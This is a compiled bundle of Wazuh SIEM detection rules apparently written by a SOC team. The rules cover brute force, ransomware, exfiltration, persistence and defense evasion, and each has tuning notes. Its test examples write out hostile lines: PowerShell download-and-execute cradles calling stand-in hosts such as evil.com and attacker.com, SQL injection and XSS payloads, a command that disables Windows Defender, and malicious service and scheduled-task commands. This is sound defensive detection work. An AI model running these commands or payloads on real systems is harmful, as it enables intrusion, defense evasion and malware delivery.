<!--
  Generated by scripts/build-wazuh-bundle.ps1
  Source: C:\2026\OPS\GITHUB\hawkinsops-repo-upgrade\detection-rules\wazuh\rules
  Generated (UTC): 2026-01-25T22:17:47Z
-->
<!-- SOURCE FILE: wazuh-051-multiple-auth-failures.xml --><!--
  Wazuh Rule: Multiple Authentication Failures
  ID: 100051
  Level: 10 (High)
  Description: Detects multiple authentication failures indicating brute force attempts
  Author: HawkinsOps SOC
  Date: 2025-11-18
-->

<group name="authentication,">
  <rule id="100051" level="10" frequency="5" timeframe="300">
    <if_matched_sid>5503,5710</if_matched_sid>
    <description>Multiple authentication failures detected - Possible brute force attack</description>
    <mitre>
      <id>T1110.001</id>
    </mitre>
    <group>authentication_failures,brute_force,</group>
  </rule>
</group>

<!--
Summary:
  Triggers when 5 or more authentication failures occur within 5 minutes from the same source.
  Detects brute force login attempts against Windows (5503) and SSH (5710) services.

Fields Used:
  - srcip: Source IP address of authentication attempts
  - user: Target username
  - timestamp: Event occurrence time

False Positives:
  - Users with forgotten passwords
  - Misconfigured automation scripts
  - Legitimate password expiration scenarios

Severity: High (10)

MITRE ATT&CK: T1110.001 - Brute Force: Password Guessing

Log Sources:
  - Windows Security Event 4625 (Failed logon)
  - Linux /var/log/auth.log (SSH failures)
  - Wazuh agent logs from endpoints

Test Examples:
  - 5 failed SSH attempts within 5 minutes
  - Multiple Windows login failures from same IP
  - Repeated authentication failures against web services

Tuning Notes:
  - Adjust frequency threshold based on your environment
  - Whitelist known scanning/monitoring tools by IP
  - Consider creating separate rules for different services
  - Correlate with successful login following failures
  - Implement IP-based blocking for repeated offenders
-->


<!-- SOURCE FILE: wazuh-052-file-integrity-critical-system.xml --><!--
  Wazuh Rule: Critical System File Modification
  ID: 100052
  Level: 12 (Critical)
  Description: Detects unauthorized modifications to critical system files
  Author: HawkinsOps SOC
  Date: 2025-11-18
-->

<group name="syscheck,">
  <rule id="100052" level="12">
    <if_sid>550</if_sid>
    <match>/etc/passwd|/etc/shadow|/etc/sudoers|/boot/|C:\Windows\System32\</match>
    <description>Critical system file modified - Possible system compromise</description>
    <mitre>
      <id>T1078</id>
    </mitre>
    <group>file_integrity,critical_files,</group>
  </rule>
</group>

<!--
Summary:
  Monitors file integrity monitoring (FIM) events for changes to critical system files
  including password files, boot configurations, and Windows system directories.

Fields Used:
  - file: Modified file path
  - md5_after: New file hash
  - md5_before: Previous file hash
  - changed_attributes: What changed (size, permissions, content)

False Positives:
  - Authorized system updates and patches
  - Package manager installations
  - Legitimate system administration
  - Configuration management tools (Ansible, Puppet, Chef)

Severity: Critical (12)

MITRE ATT&CK: T1078 - Valid Accounts

Log Sources:
  - Wazuh Syscheck module
  - File integrity monitoring events
  - Windows file system auditing
  - Linux inotify/audit events

Test Examples:
  - Modification of /etc/passwd or /etc/shadow
  - Changes to /etc/sudoers file
  - Modifications in /boot/ directory
  - Changes to Windows System32 files

Tuning Notes:
  - Configure FIM to monitor critical directories
  - Whitelist known update processes and hash changes
  - Implement change control correlation
  - Alert security team immediately for unauthorized changes
  - Maintain baseline hashes for critical files
  - Schedule regular integrity verification scans
-->


<!-- SOURCE FILE: wazuh-053-rootkit-detection.xml --><!--
  Wazuh Rule: Rootkit Detection Alert
  ID: 100053
  Level: 13 (Critical)
  Description: Rootkit detected by rootcheck module
  Author: HawkinsOps SOC
  Date: 2025-11-18
-->

<group name="rootcheck,">
  <rule id="100053" level="13">
    <if_sid>510</if_sid>
    <match>Rootkit|Trojan|Backdoor</match>
    <description>Rootkit or backdoor detected on system</description>
    <mitre>
      <id>T1014</id>
    </mitre>
    <group>rootkit,malware,</group>
  </rule>
</group>

<!--
Summary:
  Detects rootkits, trojans, and backdoors identified by Wazuh rootcheck module.
  Includes signature-based detection and behavioral anomalies.

Fields Used:
  - file: Suspected malicious file
  - detection_method: How rootkit was identified
  - description: Details of rootkit signature match

False Positives:
  - Some security tools may trigger false positives
  - Virtualization software kernel modules
  - Legitimate debugging tools
  - Custom kernel modules

Severity: Critical (13)

MITRE ATT&CK: T1014 - Rootkit

Log Sources:
  - Wazuh Rootcheck module
  - Rootkit signature databases
  - System file anomaly detection
  - Hidden process/file detection

Test Examples:
  - Detection of known rootkit signatures (e.g., Diamorphine, Reptile)
  - Hidden processes or files
  - Modified system binaries
  - Kernel module rootkits

Tuning Notes:
  - Keep rootcheck database updated
  - Schedule regular rootcheck scans
  - Immediately isolate affected systems
  - Perform forensic analysis before remediation
  - Correlate with other compromise indicators
  - Verify with secondary rootkit detection tools
  - Implement kernel module signing enforcement
-->


<!-- SOURCE FILE: wazuh-054-web-attack-sql-injection.xml --><!--
  Wazuh Rule: SQL Injection Attack Attempt
  ID: 100054
  Level: 11 (High)
  Description: Detects SQL injection patterns in web server logs
  Author: HawkinsOps SOC
  Date: 2025-11-18
-->

<group name="web,attack,">
  <rule id="100054" level="11">
    <if_sid>31100</if_sid>
    <match>union.*select|' or '1'='1|'; DROP TABLE|exec\(|<script>|javascript:</match>
    <description>Possible SQL injection or XSS attack detected</description>
    <mitre>
      <id>T1190</id>
    </mitre>
    <group>sql_injection,web_attack,</group>
  </rule>
</group>

<!--
Summary:
  Identifies SQL injection and cross-site scripting (XSS) attempts in web server
  access logs by matching common attack patterns and payloads.

Fields Used:
  - request_uri: HTTP request URI containing potential injection
  - source_ip: Attacker IP address
  - user_agent: Client user agent string
  - status_code: HTTP response code

False Positives:
  - Legitimate queries containing SQL keywords
  - Security testing and vulnerability scans
  - Web application firewalls testing
  - Developer testing environments

Severity: High (11)

MITRE ATT&CK: T1190 - Exploit Public-Facing Application

Log Sources:
  - Apache access.log
  - Nginx access.log
  - IIS logs
  - WAF logs

Test Examples:
  - /search.php?q=' OR '1'='1
  - /admin.php?id=1' UNION SELECT * FROM users--
  - /page.asp?id=1; DROP TABLE users;--
  - /?q=<script>alert('XSS')</script>

Tuning Notes:
  - Implement web application firewall (WAF)
  - Encode/decode URL-encoded payloads for better detection
  - Correlate with application error logs
  - Track repeat offenders for blocking
  - Whitelist security scanners by IP
  - Monitor for successful exploits (500 errors, unusual responses)
  - Implement input validation and parameterized queries
-->


<!-- SOURCE FILE: wazuh-055-malware-detection-virustotal.xml --><!--
  Wazuh Rule: Malware Detected via VirusTotal Integration
  ID: 100055
  Level: 12 (Critical)
  Description: File flagged as malicious by VirusTotal analysis
  Author: HawkinsOps SOC
  Date: 2025-11-18
-->

<group name="virustotal,malware,">
  <rule id="100055" level="12">
    <if_sid>87105</if_sid>
    <match>positives</match>
    <description>Malware detected by VirusTotal - Multiple AV engines flagged file</description>
    <mitre>
      <id>T1204</id>
    </mitre>
    <group>malware_detection,virustotal,</group>
  </rule>
</group>

<!--
Summary:
  Triggers when Wazuh VirusTotal integration identifies a file with positive malware
  detections from multiple antivirus engines. Requires VirusTotal API integration.

Fields Used:
  - file_path: Location of suspicious file
  - sha256: File hash
  - positives: Number of AV engines detecting as malicious
  - total: Total number of AV engines scanned
  - permalink: VirusTotal analysis link

False Positives:
  - Penetration testing tools
  - Security research samples
  - Packers and obfuscators on legitimate software
  - Heuristic false positives

Severity: Critical (12)

MITRE ATT&CK: T1204 - User Execution

Log Sources:
  - Wazuh VirusTotal integration
  - FIM events triggering VT lookups
  - Manual file upload results

Test Examples:
  - File with 10+ positive detections out of 60+ engines
  - Known malware samples (EICAR test file)
  - Recently created executable files flagged as malware

Tuning Notes:
  - Set threshold for positives (e.g., 5+ detections)
  - Whitelist known false positives by hash
  - Automatically quarantine high-confidence detections
  - Correlate with file creation and execution events
  - Submit unknown files to VT automatically
  - Monitor for files with low detection rate but unusual behavior
  - Implement API rate limiting for VirusTotal queries
-->


<!-- SOURCE FILE: wazuh-056-process-anomaly-detection.xml --><!--
  Wazuh Rule: Anomalous Process Execution Detected
  ID: 100056
  Level: 9 (Medium-High)
  Description: Unusual process execution pattern detected by anomaly detection
  Author: HawkinsOps SOC
  Date: 2025-11-18
-->

<group name="process,anomaly,">
  <rule id="100056" level="9">
    <if_sid>530</if_sid>
    <match>process</match>
    <field name="anomaly_score">^[8-9]|^10$</field>
    <description>Anomalous process detected - Unusual execution pattern</description>
    <mitre>
      <id>T1059</id>
    </mitre>
    <group>anomaly_detection,process_anomaly,</group>
  </rule>
</group>

<!--
Summary:
  Leverages Wazuh's anomaly detection capabilities to identify processes with
  unusual characteristics compared to historical baselines.

Fields Used:
  - process_name: Name of anomalous process
  - process_path: Full path to executable
  - anomaly_score: Score from 0-10 indicating deviation from baseline
  - parent_process: Parent process information

False Positives:
  - New software installations
  - System updates
  - User behavior changes
  - Seasonal business activities

Severity: Medium-High (9)

MITRE ATT&CK: T1059 - Command and Scripting Interpreter

Log Sources:
  - Wazuh process monitoring
  - Anomaly detection module
  - Behavioral analysis engine

Test Examples:
  - PowerShell execution from unusual parent process
  - System process running from non-standard location
  - Unexpected command line arguments
  - Process execution at unusual times

Tuning Notes:
  - Train baseline over at least 2-4 weeks
  - Adjust anomaly score threshold based on environment
  - Whitelist known process variations
  - Correlate with other security events
  - Review and update baselines regularly
  - Consider different baselines for different host types
  - Alert on score 8+ for production systems
-->


<!-- SOURCE FILE: wazuh-057-windows-defender-disabled.xml --><!--
  Wazuh Rule: Windows Defender Disabled
  ID: 100057
  Level: 11 (High)
  Description: Detects when Windows Defender is disabled or tampered with
  Author: HawkinsOps SOC
  Date: 2025-11-18
-->

<group name="windows,defense_evasion,">
  <rule id="100057" level="11">
    <if_sid>60000</if_sid>
    <field name="win.eventdata.newValue">^1$</field>
    <field name="win.eventdata.targetObject">\\Windows Defender\\DisableAntiSpyware|\\Real-Time Protection\\DisableRealtimeMonitoring</field>
    <description>Windows Defender has been disabled - Possible defense evasion</description>
    <mitre>
      <id>T1562.001</id>
    </mitre>
    <group>defender_disabled,defense_evasion,</group>
  </rule>
</group>

<!--
Summary:
  Monitors Windows Registry changes that disable Windows Defender real-time protection
  or anti-spyware features. Common defense evasion technique.

Fields Used:
  - win.eventdata.targetObject: Registry key modified
  - win.eventdata.newValue: New registry value (1 = disabled)
  - win.system.computer: Affected hostname
  - win.eventdata.user: User account making change

False Positives:
  - Authorized IT changes during troubleshooting
  - Software requiring Defender exclusions
  - Group Policy changes
  - Legitimate security tool installations

Severity: High (11)

MITRE ATT&CK: T1562.001 - Impair Defenses: Disable or Modify Tools

Log Sources:
  - Windows Event ID 4657 (Registry value modified)
  - Sysmon Event ID 13 (Registry value set)
  - Windows Defender operational logs

Test Examples:
  - Registry: HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware = 1
  - Registry: DisableRealtimeMonitoring = 1
  - PowerShell: Set-MpPreference -DisableRealtimeMonitoring $true

Tuning Notes:
  - Immediately alert security team
  - Correlate with other malware indicators
  - Check for malware execution preceding the disable
  - Verify against authorized change tickets
  - Implement GPO to prevent unauthorized changes
  - Monitor for Defender service stops
  - Track registry changes with Sysmon
-->


<!-- SOURCE FILE: wazuh-058-suspicious-powershell-download.xml --><!--
  Wazuh Rule: Suspicious PowerShell Download Activity
  ID: 100058
  Level: 10 (High)
  Description: PowerShell downloading files from external sources
  Author: HawkinsOps SOC
  Date: 2025-11-18
-->

<group name="windows,powershell,">
  <rule id="100058" level="10">
    <if_sid>91804</if_sid>
    <field name="win.eventdata.scriptBlockText">DownloadFile|DownloadString|Invoke-WebRequest|wget|curl|iwr|Net.WebClient</field>
    <description>PowerShell downloading content from external source</description>
    <mitre>
      <id>T1059.001</id>
    </mitre>
    <group>powershell_download,command_and_control,</group>
  </rule>
</group>

<!--
Summary:
  Detects PowerShell script block logging events showing file download operations
  using various cmdlets and .NET methods commonly used in malicious scripts.

Fields Used:
  - win.eventdata.scriptBlockText: PowerShell command content
  - win.eventdata.path: Script file path (if applicable)
  - win.system.computer: Source hostname
  - win.system.user: User executing PowerShell

False Positives:
  - Legitimate administrative scripts
  - Software update mechanisms
  - Automated deployment tools
  - IT automation workflows

Severity: High (10)

MITRE ATT&CK: T1059.001 - PowerShell

Log Sources:
  - Windows PowerShell Event 4104 (Script Block Logging)
  - Microsoft-Windows-PowerShell/Operational
  - Enhanced PowerShell logging

Test Examples:
  - (New-Object Net.WebClient).DownloadFile('http://evil.com/malware.exe','C:\temp\malware.exe')
  - Invoke-WebRequest -Uri http://c2.com/payload -OutFile payload.exe
  - IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
  - wget http://malicious.com/tool.exe -OutFile tool.exe

Tuning Notes:
  - Whitelist known update/download sources by URL pattern
  - Correlate with network connection logs
  - Check destination file paths for suspicious locations
  - Monitor for execution of downloaded files
  - Enable PowerShell script block logging
  - Track download followed by immediate execution
  - Inspect URLs against threat intelligence feeds
-->


<!-- SOURCE FILE: wazuh-059-new-service-creation.xml --><!--
  Wazuh Rule: New Windows Service Created
  ID: 100059
  Level: 8 (Medium)
  Description: Detects creation of new Windows services for potential persistence
  Author: HawkinsOps SOC
  Date: 2025-11-18
-->

<group name="windows,service,">
  <rule id="100059" level="8">
    <if_sid>60612</if_sid>
    <field name="win.system.eventID">^7045$</field>
    <description>New Windows service installed on system</description>
    <mitre>
      <id>T1543.003</id>
    </mitre>
    <group>service_creation,persistence,</group>
  </rule>

  <rule id="100059001" level="10">
    <if_sid>100059</if_sid>
    <field name="win.eventdata.imagePath">\\Temp\\|\\AppData\\|\\Users\\Public\\|cmd.exe|powershell.exe</field>
    <description>Suspicious Windows service created - Unusual executable path</description>
    <mitre>
      <id>T1543.003</id>
    </mitre>
    <group>service_creation,persistence,suspicious,</group>
  </rule>
</group>

<!--
Summary:
  Monitors Windows System Event 7045 for new service installations. Elevated severity
  when service executable path contains suspicious locations or scripts.

Fields Used:
  - win.eventdata.serviceName: Name of new service
  - win.eventdata.imagePath: Service executable path
  - win.eventdata.serviceType: Service type
  - win.eventdata.startType: Service start mode
  - win.eventdata.accountName: Service account

False Positives:
  - Legitimate software installations
  - Windows updates
  - Driver installations
  - Enterprise deployment tools

Severity: Medium (8), High (10 for suspicious paths)

MITRE ATT&CK: T1543.003 - Create or Modify System Process: Windows Service

Log Sources:
  - Windows System Event 7045 (Service Installation)
  - Windows Security Event 4697 (Service Installation)

Test Examples:
  - Service: "WindowsUpdate" ImagePath: "C:\Users\Public\malware.exe"
  - Service with ImagePath: "cmd.exe /c C:\temp\backdoor.bat"
  - Service running PowerShell scripts from AppData

Tuning Notes:
  - Whitelist known software installation services
  - Alert on services with SYSTEM privileges from unusual paths
  - Monitor for service creation followed by immediate start
  - Check service description for generic or suspicious text
  - Correlate with file creation events
  - Track service creation outside business hours
  - Verify service binaries with digital signatures
-->


<!-- SOURCE FILE: wazuh-060-unauthorized-privileged-account-use.xml --><!--
  Wazuh Rule: Unauthorized Privileged Account Usage
  ID: 100060
  Level: 11 (High)
  Description: Detects privileged account usage from unusual locations or times
  Author: HawkinsOps SOC
  Date: 2025-11-18
-->

<group name="authentication,privilege,">
  <rule id="100060" level="11">
    <if_sid>60122</if_sid>
    <field name="win.eventdata.targetUserName">^admin|^root|^administrator</field>
    <field name="win.eventdata.logonType">^10$</field>
    <time>00:00-06:00</time>
    <description>Privileged account used during off-hours - Possible unauthorized access</description>
    <mitre>
      <id>T1078.002</id>
    </mitre>
    <group>privileged_access,suspicious_logon,</group>
  </rule>
</group>

<!--
Summary:
  Monitors successful logons (Event 4624) for privileged accounts (admin, root, administrator)
  during unusual hours (midnight to 6 AM) with RDP logon type (10).

Fields Used:
  - win.eventdata.targetUserName: Account name used
  - win.eventdata.logonType: Type of logon (10 = RDP)
  - win.eventdata.ipAddress: Source IP address
  - win.system.timeCreated: Timestamp of event

False Positives:
  - Authorized night shift administrators
  - Scheduled maintenance windows
  - Emergency system operations
  - Global teams in different time zones

Severity: High (11)

MITRE ATT&CK: T1078.002 - Valid Accounts: Domain Accounts

Log Sources:
  - Windows Security Event 4624 (Successful logon)
  - Domain controller security logs
  - Workstation security logs

Test Examples:
  - Administrator account RDP logon at 3:00 AM
  - Root account login from unusual geographic location
  - Admin account access from non-corporate IP address

Tuning Notes:
  - Adjust time range based on business operations
  - Whitelist authorized maintenance windows
  - Correlate with VPN connection logs
  - Alert on privileged logons from unexpected IPs
  - Track privileged account usage patterns
  - Implement privileged access management (PAM)
  - Require MFA for all privileged accounts
  - Monitor for lateral movement following privileged logon
-->


<!-- SOURCE FILE: wazuh-061-port-scan-detection.xml --><!--
  Wazuh Rule: Port Scanning Activity Detected
  ID: 100061
  Level: 9 (Medium-High)
  Description: Detects port scanning attempts from internal or external sources
  Author: HawkinsOps SOC
  Date: 2025-11-18
-->

<group name="network,reconnaissance,">
  <rule id="100061" level="9" frequency="20" timeframe="60">
    <if_matched_sid>5104</if_matched_sid>
    <same_source_ip />
    <description>Port scan detected - Multiple connection attempts from same source</description>
    <mitre>
      <id>T1046</id>
    </mitre>
    <group>port_scan,network_scan,reconnaissance,</group>
  </rule>
</group>

<!--
Summary:
  Identifies port scanning by correlating 20+ connection attempts from the same source IP
  within 60 seconds. Indicates network reconnaissance activity.

Fields Used:
  - srcip: Source IP conducting scan
  - dstport: Destination ports targeted
  - protocol: Network protocol used
  - connection_state: TCP connection states

False Positives:
  - Network vulnerability scanners
  - Network monitoring tools
  - Service discovery tools
  - Load balancers performing health checks

Severity: Medium-High (9)

MITRE ATT&CK: T1046 - Network Service Discovery

Log Sources:
  - Firewall logs
  - IDS/IPS alerts
  - Network flow data
  - Syslog from network devices

Test Examples:
  - Nmap scan: nmap -p 1-65535 target-host
  - SYN scan from single IP to multiple ports
  - Connection attempts to closed ports
  - Rapid sequential port probing

Tuning Notes:
  - Whitelist authorized vulnerability scanners by IP
  - Adjust frequency threshold for noisy environments
  - Track scanning patterns (sequential, random, specific ports)
  - Correlate with other reconnaissance activities
  - Alert on scans targeting critical infrastructure
  - Monitor for scans from internal sources (compromised hosts)
  - Implement network segmentation to limit scan impact
-->


<!-- SOURCE FILE: wazuh-062-file-encryption-ransomware.xml --><!--
  Wazuh Rule: Potential Ransomware File Encryption Activity
  ID: 100062
  Level: 13 (Critical)
  Description: Detects rapid file modification patterns consistent with ransomware encryption
  Author: HawkinsOps SOC
  Date: 2025-11-18
-->

<group name="ransomware,malware,">
  <rule id="100062" level="13" frequency="50" timeframe="120">
    <if_matched_sid>554</if_matched_sid>
    <match>\.encrypted|\.locked|\.crypto|\.crypt|\.enc|README|DECRYPT|RESTORE</match>
    <description>Ransomware activity detected - Mass file encryption in progress</description>
    <mitre>
      <id>T1486</id>
    </mitre>
    <group>ransomware,file_encryption,</group>
  </rule>
</group>

<!--
Summary:
  Detects ransomware by identifying 50+ file modifications within 2 minutes with common
  ransomware file extensions or README/ransom note creation patterns.

Fields Used:
  - file_path: Files being encrypted/modified
  - file_extension: New file extensions
  - process: Process performing encryption
  - user: User context of encryption process

False Positives:
  - Legitimate bulk file operations
  - Backup and archival processes
  - Mass file encryption tools (legitimate crypto)
  - Data migration activities

Severity: Critical (13)

MITRE ATT&CK: T1486 - Data Encrypted for Impact

Log Sources:
  - Wazuh FIM (File Integrity Monitoring)
  - Sysmon Event ID 11 (File Created)
  - Windows Security Event 4663 (File Access)
  - File system audit logs

Test Examples:
  - 100 files changed to .encrypted extension within 2 minutes
  - Creation of DECRYPT_INSTRUCTIONS.txt files
  - Mass modification of documents to .locked
  - README_TO_DECRYPT files appearing in multiple directories

Tuning Notes:
  - Immediately isolate affected systems from network
  - Kill suspicious processes immediately
  - Enable Volume Shadow Copy protection
  - Implement behavioral ransomware detection
  - Monitor for unusual process file access patterns
  - Deploy honeypot files to detect early encryption
  - Maintain offline backups
  - Consider endpoint detection and response (EDR) solutions
-->


<!-- SOURCE FILE: wazuh-063-data-exfiltration-detection.xml --><!--
  Wazuh Rule: Potential Data Exfiltration Detected
  ID: 100063
  Level: 10 (High)
  Description: Detects large outbound data transfers indicating possible exfiltration
  Author: HawkinsOps SOC
  Date: 2025-11-18
-->

<group name="exfiltration,network,">
  <rule id="100063" level="10">
    <if_sid>5120</if_sid>
    <field name="bytes_out">^[5-9]\d{8,}$|^\d{9,}$</field>
    <description>Large outbound data transfer detected - Possible data exfiltration</description>
    <mitre>
      <id>T1041</id>
    </mitre>
    <group>data_exfiltration,network_transfer,</group>
  </rule>
</group>

<!--
Summary:
  Triggers on outbound network connections transferring 500MB+ data, which may indicate
  data theft or exfiltration attempts.

Fields Used:
  - bytes_out: Outbound data volume
  - dst_ip: Destination IP address
  - dst_port: Destination port
  - src_user: User account initiating transfer
  - protocol: Network protocol used

False Positives:
  - Legitimate cloud backups
  - File sharing services
  - Software updates and downloads
  - Database replication
  - Video conferencing and streaming

Severity: High (10)

MITRE ATT&CK: T1041 - Exfiltration Over C2 Channel

Log Sources:
  - Firewall logs with byte count
  - Network flow data (NetFlow, IPFIX)
  - Proxy logs
  - Network monitoring tools

Test Examples:
  - 2GB upload to unknown external IP
  - Large FTP transfer to suspicious destination
  - HTTP POST with massive data payload
  - Cloud storage upload of unusual size

Tuning Notes:
  - Adjust byte threshold based on normal business operations
  - Whitelist known backup destinations and cloud services
  - Monitor for transfers to unknown/new destinations
  - Correlate with file access events
  - Check for compression/archival before transfer
  - Alert on transfers during off-hours
  - Track destinations against threat intelligence
  - Implement DLP (Data Loss Prevention) solutions
-->


<!-- SOURCE FILE: wazuh-064-impossible-travel-detection.xml --><!--
  Wazuh Rule: Impossible Travel Detection
  ID: 100064
  Level: 12 (Critical)
  Description: Detects user logins from geographically impossible locations within short timeframes
  Author: HawkinsOps SOC
  Date: 2025-11-18
-->

<group name="authentication,anomaly,">
  <rule id="100064" level="12">
    <if_sid>60122</if_sid>
    <field name="data.geoip.distance">^[5-9]\d{3,}$|^\d{5,}$</field>
    <field name="data.time_diff">^[1-5]\d{2}$|^[1-9]\d{1}$</field>
    <description>Impossible travel detected - User logged in from distant location too quickly</description>
    <mitre>
      <id>T1078</id>
    </mitre>
    <group>impossible_travel,credential_compromise,</group>
  </rule>
</group>

<!--
Summary:
  Identifies scenarios where a user authenticates from two geographic locations that are
  physically impossible to travel between in the time elapsed (e.g., 5000+ km in <10 minutes).

Fields Used:
  - user: Username
  - geoip.location: Current login location
  - geoip.previous_location: Previous login location
  - geoip.distance: Distance between locations (km)
  - time_diff: Time between logins (seconds)

False Positives:
  - VPN usage changing apparent location
  - Shared accounts (should be eliminated)
  - GeoIP database inaccuracies
  - Cloud services with multiple regional endpoints

Severity: Critical (12)

MITRE ATT&CK: T1078 - Valid Accounts

Log Sources:
  - Authentication logs with GeoIP enrichment
  - VPN connection logs
  - Cloud service authentication
  - Wazuh GeoIP integration

Test Examples:
  - User logs in from New York at 10:00 AM, then from London at 10:05 AM
  - Authentication from Tokyo then Sydney within 1 hour
  - Rapid location changes across continents

Tuning Notes:
  - Requires GeoIP database and enrichment
  - Adjust distance and time thresholds based on environment
  - Whitelist known VPN exit points
  - Immediately investigate and potentially block account
  - Correlate with account compromise indicators
  - Implement MFA to prevent credential theft impact
  - Track and baseline normal user login patterns
  - Consider time zones and business travel schedules
-->


<!-- SOURCE FILE: wazuh-065-aws-s3-bucket-public-exposure.xml --><!--
  Wazuh Rule: AWS S3 Bucket Made Public
  ID: 100065
  Level: 11 (High)
  Description: Detects when S3 bucket permissions are changed to allow public access
  Author: HawkinsOps SOC
  Date: 2025-11-18
-->

<group name="aws,cloud,s3,">
  <rule id="100065" level="11">
    <if_sid>80200</if_sid>
    <field name="aws.eventName">PutBucketAcl|PutBucketPolicy</field>
    <field name="aws.requestParameters.AccessControlPolicy.AccessControlList.Grant.Grantee.URI">http://acs.amazonaws.com/groups/global/AllUsers</field>
    <description>AWS S3 bucket made publicly accessible - Potential data exposure</description>
    <mitre>
      <id>T1530</id>
    </mitre>
    <group>cloud_security,s3_exposure,</group>
  </rule>
</group>

<!--
Summary:
  Monitors AWS CloudTrail logs for S3 bucket ACL or policy changes that grant public access
  to AllUsers or AuthenticatedUsers groups, creating data exposure risk.

Fields Used:
  - aws.eventName: API call made (PutBucketAcl, PutBucketPolicy)
  - aws.requestParameters.bucketName: Affected S3 bucket
  - aws.userIdentity.principalId: User making the change
  - aws.sourceIPAddress: Source IP of API call

False Positives:
  - Intentional public buckets for static website hosting
  - Public content delivery buckets
  - Authorized changes for legitimate sharing

Severity: High (11)

MITRE ATT&CK: T1530 - Data from Cloud Storage Object

Log Sources:
  - AWS CloudTrail logs
  - Wazuh AWS integration
  - S3 server access logs

Test Examples:
  - PutBucketAcl making bucket readable by AllUsers
  - Bucket policy granting public GetObject permissions
  - ACL change allowing authenticated users access

Tuning Notes:
  - Immediately review and revert unauthorized public buckets
  - Whitelist intentionally public buckets
  - Enable S3 Block Public Access by default
  - Monitor for bulk permission changes
  - Implement least-privilege IAM policies
  - Use S3 bucket policies to restrict access
  - Enable S3 access logging for audit trails
  - Regularly audit bucket permissions
-->


<!-- SOURCE FILE: wazuh-066-linux-suspicious-sudo-password-change.xml --><!--
  Wazuh Rule: Suspicious Sudo Password Change
  ID: 100066
  Level: 10 (High)
  Description: Detects password changes for privileged accounts via sudo
  Author: HawkinsOps SOC
  Date: 2025-11-18
-->

<group name="linux,sudo,">
  <rule id="100066" level="10">
    <if_group>sudo</if_group>
    <match>COMMAND=/usr/bin/passwd root|COMMAND=/usr/bin/passwd admin</match>
    <description>Privileged account password changed via sudo - Verify authorization</description>
    <mitre>
      <id>T1098</id>
    </mitre>
    <group>account_manipulation,sudo_abuse,</group>
  </rule>
</group>

<!--
Summary:
  Monitors sudo logs for passwd command execution targeting privileged accounts (root, admin)
  which may indicate unauthorized account takeover or persistence.

Fields Used:
  - user: User executing sudo command
  - command: Full command executed
  - tty: Terminal session
  - pwd: Working directory

False Positives:
  - Legitimate password rotation by administrators
  - Authorized account management
  - Scheduled password changes per policy

Severity: High (10)

MITRE ATT&CK: T1098 - Account Manipulation

Log Sources:
  - /var/log/auth.log (Debian/Ubuntu)
  - /var/log/secure (RHEL/CentOS)
  - Sudo logs

Test Examples:
  - sudo passwd root
  - sudo passwd admin
  - sudo chpasswd (bulk password changes)

Tuning Notes:
  - Whitelist authorized administrators
  - Correlate with change management tickets
  - Alert on password changes outside maintenance windows
  - Monitor for password changes following compromise indicators
  - Require MFA for privileged password changes
  - Log all sudo activity for audit trail
  - Implement password complexity and rotation policies
-->


<!-- SOURCE FILE: wazuh-067-dns-tunneling-detection.xml --><!--
  Wazuh Rule: DNS Tunneling Detected
  ID: 100067
  Level: 11 (High)
  Description: Detects DNS queries with characteristics of DNS tunneling for C2 or exfiltration
  Author: HawkinsOps SOC
  Date: 2025-11-18
-->

<group name="dns,network,">
  <rule id="100067" level="11" frequency="30" timeframe="300">
    <if_sid>5200</if_sid>
    <field name="dns.query.length">^[6-9]\d$|^\d{3,}$</field>
    <same_source_ip />
    <description>DNS tunneling detected - Abnormally long or frequent DNS queries</description>
    <mitre>
      <id>T1071.004</id>
    </mitre>
    <group>dns_tunneling,command_and_control,</group>
  </rule>
</group>

<!--
Summary:
  Identifies DNS tunneling by detecting excessive DNS queries (30+ in 5 minutes) from the same
  source with unusually long query names (60+ characters), indicative of data encoding.

Fields Used:
  - dns.query: DNS query string
  - dns.query.length: Length of DNS query
  - dns.query.type: Query type (TXT, NULL often used for tunneling)
  - srcip: Source IP making queries

False Positives:
  - Legitimate CDN or security services using long domains
  - Some cloud services with lengthy domain names
  - Certain advertising or tracking domains

Severity: High (11)

MITRE ATT&CK: T1071.004 - Application Layer Protocol: DNS

Log Sources:
  - DNS server logs
  - DNS query logs
  - Network packet capture
  - Firewall DNS inspection

Test Examples:
  - Queries to subdomain like: a1b2c3d4e5f6g7h8.tunneldomain.com
  - Rapid sequential DNS TXT queries
  - Base64-encoded data in subdomain labels
  - NULL record queries with encoded payloads

Tuning Notes:
  - Baseline normal DNS query patterns
  - Alert on TXT and NULL record queries to unusual domains
  - Monitor for high entropy in subdomain labels
  - Check for periodic query patterns (beaconing)
  - Implement DNS sinkholing for known C2 domains
  - Use threat intelligence feeds for known tunneling domains
  - Consider DNS query length and character distribution analysis
-->


<!-- SOURCE FILE: wazuh-068-suspicious-scheduled-task-xml.xml --><!--
  Wazuh Rule: Suspicious Scheduled Task Creation via XML
  ID: 100068
  Level: 9 (Medium-High)
  Description: Detects scheduled task creation using XML import method
  Author: HawkinsOps SOC
  Date: 2025-11-18
-->

<group name="windows,scheduled_task,">
  <rule id="100068" level="9">
    <if_sid>60000</if_sid>
    <field name="win.eventdata.commandLine">/Create /XML|schtasks.*\/xml</field>
    <description>Scheduled task created via XML import - Review task contents</description>
    <mitre>
      <id>T1053.005</id>
    </mitre>
    <group>scheduled_task,persistence,</group>
  </rule>

  <rule id="100068001" level="11">
    <if_sid>100068</if_sid>
    <field name="win.eventdata.commandLine">\\Temp\\|\\AppData\\|\\Public\\</field>
    <description>Suspicious scheduled task created via XML from unusual location</description>
    <mitre>
      <id>T1053.005</id>
    </mitre>
    <group>scheduled_task,persistence,suspicious,</group>
  </rule>
</group>

<!--
Summary:
  Monitors for schtasks.exe usage with /XML parameter which creates tasks from XML files.
  Elevated severity when XML file is in suspicious location.

Fields Used:
  - win.eventdata.commandLine: Full command line
  - win.eventdata.image: Process path (schtasks.exe)
  - win.eventdata.user: User creating task
  - win.eventdata.parentImage: Parent process

False Positives:
  - Legitimate administrative task creation
  - Software deployment tools
  - Configuration management systems
  - IT automation scripts

Severity: Medium-High (9), High (11 for suspicious paths)

MITRE ATT&CK: T1053.005 - Scheduled Task/Job

Log Sources:
  - Sysmon Event ID 1 (Process Creation)
  - Windows Security Event 4688
  - Windows Task Scheduler Event 106

Test Examples:
  - schtasks /Create /XML C:\\Temp\\malicious.xml /TN "Backdoor"
  - schtasks.exe /create /tn "Update" /xml %APPDATA%\\task.xml
  - XML task with suspicious actions or triggers

Tuning Notes:
